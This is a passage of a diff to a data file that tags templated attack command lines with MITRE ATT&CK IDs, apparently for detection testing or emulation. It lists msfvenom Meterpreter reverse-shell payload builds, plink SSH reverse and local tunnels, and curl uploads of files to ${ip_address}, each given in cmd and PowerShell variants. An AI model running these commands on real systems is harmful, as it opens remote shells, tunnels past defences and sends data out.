 T1071 msfvenom -p windows/meterpreter/reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-T1071 cmd /c "msfvenom -p windows/meterpreter/reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-T1071 powershell -c "msfvenom -p windows/meterpreter/reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+T1071 cmd /c msfvenom -p windows/meterpreter/reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+T1071 powershell -c msfvenom -p windows/meterpreter/reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
 T1071 msfvenom -p windows/meterpreter/reverse_tcp_rc4_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-T1071 cmd /c "msfvenom -p windows/meterpreter/reverse_tcp_rc4_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-T1071 powershell -c "msfvenom -p windows/meterpreter/reverse_tcp_rc4_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+T1071 cmd /c msfvenom -p windows/meterpreter/reverse_tcp_rc4_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+T1071 powershell -c msfvenom -p windows/meterpreter/reverse_tcp_rc4_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
 T1071 msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-T1071 cmd /c "msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-T1071 powershell -c "msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+T1071 cmd /c msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+T1071 powershell -c msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
 T1071 msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-T1071 cmd /c "msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-T1071 powershell -c "msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+T1071 cmd /c msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+T1071 powershell -c msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
 T1071 msfvenom -p windows/meterpreter_reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-T1071 cmd /c "msfvenom -p windows/meterpreter_reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-T1071 powershell -c "msfvenom -p windows/meterpreter_reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+T1071 cmd /c msfvenom -p windows/meterpreter_reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+T1071 powershell -c msfvenom -p windows/meterpreter_reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
 T1071 msfvenom -p windows/meterpreter_reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-T1071 cmd /c "msfvenom -p windows/meterpreter_reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-T1071 powershell -c "msfvenom -p windows/meterpreter_reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+T1071 cmd /c msfvenom -p windows/meterpreter_reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+T1071 powershell -c msfvenom -p windows/meterpreter_reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
 T1071 msfvenom -p windows/meterpreter_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-T1071 cmd /c "msfvenom -p windows/meterpreter_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-T1071 powershell -c "msfvenom -p windows/meterpreter_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+T1071 cmd /c msfvenom -p windows/meterpreter_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+T1071 powershell -c msfvenom -p windows/meterpreter_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
 T1071 msfvenom -p windows/meterpreter/reverse_https_proxy LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-T1071 cmd /c "msfvenom -p windows/meterpreter/reverse_https_proxy LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-T1071 powershell -c "msfvenom -p windows/meterpreter/reverse_https_proxy LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+T1071 cmd /c msfvenom -p windows/meterpreter/reverse_https_proxy LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+T1071 powershell -c msfvenom -p windows/meterpreter/reverse_https_proxy LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
 T1071 msfvenom -p windows/meterpreter/reverse_winhttp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-T1071 cmd /c "msfvenom -p windows/meterpreter/reverse_winhttp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-T1071 powershell -c "msfvenom -p windows/meterpreter/reverse_winhttp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+T1071 cmd /c msfvenom -p windows/meterpreter/reverse_winhttp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+T1071 powershell -c msfvenom -p windows/meterpreter/reverse_winhttp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
 T1071 msfvenom -p windows/meterpreter/reverse_winhttps LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-T1071 cmd /c "msfvenom -p windows/meterpreter/reverse_winhttps LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-T1071 powershell -c "msfvenom -p windows/meterpreter/reverse_winhttps LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+T1071 cmd /c msfvenom -p windows/meterpreter/reverse_winhttps LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+T1071 powershell -c msfvenom -p windows/meterpreter/reverse_winhttps LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
 T1071 msfvenom -p windows/x64/meterpreter_reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-T1071 cmd /c "msfvenom -p windows/x64/meterpreter_reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-T1071 powershell -c "msfvenom -p windows/x64/meterpreter_reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+T1071 cmd /c msfvenom -p windows/x64/meterpreter_reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+T1071 powershell -c msfvenom -p windows/x64/meterpreter_reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
 T1071 msfvenom -p windows/x64/meterpreter_reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-T1071 cmd /c "msfvenom -p windows/x64/meterpreter_reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-T1071 powershell -c "msfvenom -p windows/x64/meterpreter_reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+T1071 cmd /c msfvenom -p windows/x64/meterpreter_reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+T1071 powershell -c msfvenom -p windows/x64/meterpreter_reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
 T1071 msfvenom -p windows/x64/meterpreter/reverse_winhttps LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-T1071 cmd /c "msfvenom -p windows/x64/meterpreter/reverse_winhttps LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-T1071 powershell -c "msfvenom -p windows/x64/meterpreter/reverse_winhttps LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe" 
+T1071 cmd /c msfvenom -p windows/x64/meterpreter/reverse_winhttps LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+T1071 powershell -c msfvenom -p windows/x64/meterpreter/reverse_winhttps LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe 
 T1071 msfvenom -p windows/x64/meterpreter/reverse_winhttp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-T1071 cmd /c "msfvenom -p windows/x64/meterpreter/reverse_winhttp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-T1071 powershell -c "msfvenom -p windows/x64/meterpreter/reverse_winhttp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe" 
+T1071 cmd /c msfvenom -p windows/x64/meterpreter/reverse_winhttp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+T1071 powershell -c msfvenom -p windows/x64/meterpreter/reverse_winhttp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe 
 T1071 msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-T1071 cmd /c "msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-T1071 powershell -c "msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe" 
+T1071 cmd /c msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+T1071 powershell -c msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe 
 T1071 msfvenom -p windows/x64/meterpreter/reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-T1071 cmd /c "msfvenom -p windows/x64/meterpreter/reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-T1071 powershell -c "msfvenom -p windows/x64/meterpreter/reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe" 
+T1071 cmd /c msfvenom -p windows/x64/meterpreter/reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+T1071 powershell -c msfvenom -p windows/x64/meterpreter/reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe 
 T1071 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-T1071 cmd /c "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
-T1071 powershell -c "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe" 
+T1071 cmd /c msfvenom -p windows/x64/meterpreter/reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+T1071 powershell -c msfvenom -p windows/x64/meterpreter/reverse_https LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe 
 
 # T1572 Protocol Tunnel
 T1572 plink -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}
-T1572 cmd /c "plink -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
-T1572 powershell -c "plink -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
+T1572 cmd /c plink -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}
+T1572 powershell -c plink -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}
 T1572 plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}
-T1572 cmd /c "plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
-T1572 powershell -c "plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
+T1572 cmd /c plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}
+T1572 powershell -c plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}
 T1572 plink -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}
-T1572 cmd /c "plink -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
-T1572 powershell -c "plink -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
+T1572 cmd /c plink -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}
+T1572 powershell -c plink -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}
 T1572 plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}
-T1572 cmd /c "plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
-T1572 powershell -c "plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
+T1572 cmd /c plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}
+T1572 powershell -c plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}
 T1572 plink -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}
-T1572 cmd /c "plink -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
-T1572 powershell -c "plink -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
+T1572 cmd /c plink -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}
+T1572 powershell -c plink -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}
 T1572 plink.exe -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}
-T1572 cmd /c "plink.exe -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
-T1572 powershell -c "plink.exe -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
+T1572 cmd /c plink.exe -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}
+T1572 powershell -c plink.exe -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}
 T1572 plink -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}
-T1572 cmd /c "plink -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
-T1572 powershell -c "plink -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
+T1572 cmd /c plink -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}
+T1572 powershell -c plink -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}
 T1572 plink.exe -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}
-T1572 cmd /c "plink.exe -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
-T1572 powershell -c "plink.exe -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}"
+T1572 cmd /c plink.exe -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}
+T1572 powershell -c plink.exe -ssh -l ${username} -pw ${password} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port}
 T1572 plink.exe -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-T1572 cmd /c "plink.exe -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-T1572 powershell -c "plink.exe -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+T1572 cmd /c plink.exe -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+T1572 powershell -c plink.exe -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
 T1572 plink -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-T1572 cmd /c "plink -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-T1572 powershell -c "plink -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+T1572 cmd /c plink -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+T1572 powershell -c plink -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
 T1572 plink.exe -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-T1572 cmd /c "plink.exe -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-T1572 powershell -c "plink.exe -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+T1572 cmd /c plink.exe -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+T1572 powershell -c plink.exe -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
 T1572 plink -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-T1572 cmd /c "plink -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-T1572 powershell -c "plink -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+T1572 cmd /c plink -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+T1572 powershell -c plink -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
 T1572 plink -ssh -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-T1572 cmd /c "plink -ssh -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-T1572 powershell -c "plink -ssh -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+T1572 cmd /c plink -ssh -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+T1572 powershell -c plink -ssh -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
 T1572 plink.exe -ssh -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-T1572 cmd /c "plink.exe -ssh -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-T1572 powershell -c "plink.exe -ssh -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+T1572 cmd /c plink.exe -ssh -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+T1572 powershell -c plink.exe -ssh -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
 T1572 plink -ssh -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-T1572 cmd /c "plink -ssh -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-T1572 powershell -c "plink -ssh -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+T1572 cmd /c plink -ssh -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+T1572 powershell -c plink -ssh -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
 T1572 plink.exe -ssh -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-T1572 cmd /c "plink.exe -ssh -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-T1572 powershell -c "plink.exe -ssh -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+T1572 cmd /c plink.exe -ssh -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+T1572 powershell -c plink.exe -ssh -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
 T1572 plink.exe -ssh ${username}@${ip_address} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-T1572 cmd /c "plink.exe -ssh ${username}@${ip_address} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-T1572 powershell -c "plink.exe -ssh ${username}@${ip_address} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+T1572 cmd /c plink.exe -ssh ${username}@${ip_address} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+T1572 powershell -c plink.exe -ssh ${username}@${ip_address} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
 T1572 plink -ssh ${username}@${ip_address} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-T1572 cmd /c "plink -ssh ${username}@${ip_address} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-T1572 powershell -c "plink -ssh ${username}@${ip_address} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+T1572 cmd /c plink -ssh ${username}@${ip_address} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+T1572 powershell -c plink -ssh ${username}@${ip_address} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
 T1572 plink.exe -ssh ${username}@${ip_address} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-T1572 cmd /c "plink.exe -ssh ${username}@${ip_address} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-T1572 powershell -c "plink.exe -ssh ${username}@${ip_address} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+T1572 cmd /c plink.exe -ssh ${username}@${ip_address} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+T1572 powershell -c plink.exe -ssh ${username}@${ip_address} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
 T1572 plink -ssh ${username}@${ip_address} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-T1572 cmd /c "plink -ssh ${username}@${ip_address} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-T1572 powershell -c "plink -ssh ${username}@${ip_address} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+T1572 cmd /c plink -ssh ${username}@${ip_address} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+T1572 powershell -c plink -ssh ${username}@${ip_address} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
 T1572 plink -ssh -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-T1572 cmd /c "plink -ssh -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-T1572 powershell -c "plink -ssh -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+T1572 cmd /c plink -ssh -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+T1572 powershell -c plink -ssh -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
 T1572 plink.exe -ssh -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-T1572 cmd /c "plink.exe -ssh -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-T1572 powershell -c "plink.exe -ssh -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+T1572 cmd /c plink.exe -ssh -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+T1572 powershell -c plink.exe -ssh -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
 T1572 plink -ssh -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-T1572 cmd /c "plink -ssh -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-T1572 powershell -c "plink -ssh-l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+T1572 cmd /c plink -ssh -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+T1572 powershell -c plink -ssh-l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
 T1572 plink.exe -ssh -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
-T1572 cmd /c "plink.exe -ssh -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
-T1572 powershell -c "plink.exe -ssh -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+T1572 cmd /c plink.exe -ssh -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+T1572 powershell -c plink.exe -ssh -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
 
 # T1567 Exfiltration Over Web Service
 T1567 curl -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'
-T1567 cmd /c "curl -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'"
-T1567 powershell -c "curl -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'"
+T1567 cmd /c curl -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'
+T1567 powershell -c curl -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'
 T1567 curl.exe -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'
-T1567 cmd /c "curl.exe -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'"
-T1567 powershell -c "curl.exe -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'"
+T1567 cmd /c curl.exe -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'
+T1567 powershell -c curl.exe -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'
 T1567 curl -X POST http://${ip_address}/upload -F 'files=@${source_file_path}'
-T1567 cmd /c "curl -X POST http://${ip_address}/upload -F 'files=@${source_file_path}'"
-T1567 powershell -c "curl -X POST http://${ip_address}/upload -F 'files=@${source_file_path}'"
+T1567 cmd /c curl -X POST http://${ip_address}/upload -F 'files=@${source_file_path}'
+T1567 powershell -c curl -X POST http://${ip_address}/upload -F 'files=@${source_file_path}'
 T1567 curl.exe -X POST http://${ip_address}/upload -F 'files=@${source_file_path}'
-T1567 cmd /c "curl.exe -X POST http://${ip_address}/upload -F 'files=@${source_file_path}'"
-T1567 powershell -c "curl.exe -X POST http://${ip_address}/upload -F 'files=@${source_file_path}'"
+T1567 cmd /c curl.exe -X POST http://${ip_address}/upload -F 'files=@${source_file_path}'
+T1567 powershell -c curl.exe -X POST http://${ip_address}/upload -F 'files=@${source_file_path}'
 T1567 curl -F 'file=@${source_file_path}' -X POST http://${ip_address}:${port}/upload
-T1567 cmd /c "curl -F 'file=@${source_file_path}' -X POST http://${ip_address}:${port}/upload"
-T1567 powershell -c "curl -F 'file=@${source_file_path}' -X POST http://${ip_address}:${port}/upload"
+T1567 cmd /c curl -F 'file=@${source_file_path}' -X POST http://${ip_address}:${port}/upload
+T1567 powershell -c curl -F 'file=@${source_file_path}' -X POST http://${ip_address}:${port}/upload
